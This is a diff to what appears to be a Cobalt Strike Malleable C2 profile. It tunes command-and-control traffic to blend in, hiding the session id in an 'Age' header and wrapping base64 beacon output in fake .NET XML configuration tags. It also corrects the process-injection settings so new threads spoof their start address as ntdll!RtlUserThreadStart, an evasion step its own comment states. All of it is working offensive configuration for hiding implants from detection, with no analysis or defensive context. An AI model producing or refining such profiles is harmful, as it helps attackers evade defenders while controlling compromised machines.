@@ -80,11 +80,8 @@ http-post {
 	set verb "GET";
 
 	client {
-		header	"Connection"	"keep-alive";
-
 		id {
-			prepend	"timeout=";
-			header	"Keep-Alive";
+			header	"Age";
 		}
 		
 		output {
@@ -101,9 +98,11 @@ http-post {
 			base64;
 			prepend "<add key=\"connectionstring\" value=\"";
 			prepend "<appSettings>";
+			prepend	"<configuration>";
 			prepend "<?xml version=\"1.0\" encoding=\"utf-8\"?>";
 			append  "\"/>";
 			append  "</appSettings>";
+			append	"</configuration>";
 			print;
 		}
 	}
@@ -145,9 +144,11 @@ http-get {
 			base64;
 			prepend "<add key=\"connectionstring\" value=\"";
 			prepend "<appSettings>";
+			prepend "<configuration>";
 			prepend "<?xml version=\"1.0\" encoding=\"utf-8\"?>";
 			append  "\"/>";
 			append  "</appSettings>";
+			append	"</configuration>";
 			print;
 		}
 	}
@@ -168,7 +169,7 @@ process-inject {
 	## Avoids leaving behind an easy start address
 	##
 	execute {
-		CreateThread "ntdlld!RtlUserThreadStart";
+		CreateThread "ntdll!RtlUserThreadStart";
 		SetThreadContext;
 		NtQueueApcThread-s;
 		RtlCreateUserThread;
